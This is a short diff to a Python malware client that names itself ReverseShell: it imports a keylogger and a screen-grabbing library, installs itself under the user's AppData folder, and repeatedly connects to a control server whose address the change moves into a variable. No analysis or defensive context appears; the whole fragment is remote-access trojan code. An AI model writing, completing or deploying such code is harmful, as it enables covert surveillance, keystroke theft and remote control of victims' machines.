@@ -11,10 +11,9 @@ import requests
 import PIL.ImageGrab
 from keylogger import keylogger
 
+host = ("127.0.0.1", 6666)
 location = os.environ["appdata"] + "\\ReverseShell.exe"  # C:\Users\%username%\AppData\Roaming\ReverseShell.exe
-keylogger_path = os.environ["appdata"] + "\\keylog.txt"
 debug = False
-
 
 def client():
     global s
@@ -22,7 +21,7 @@ def client():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("127.0.0.1", 6666))
+            s.connect(host)
             print("Connected to Server")
             break
         except:
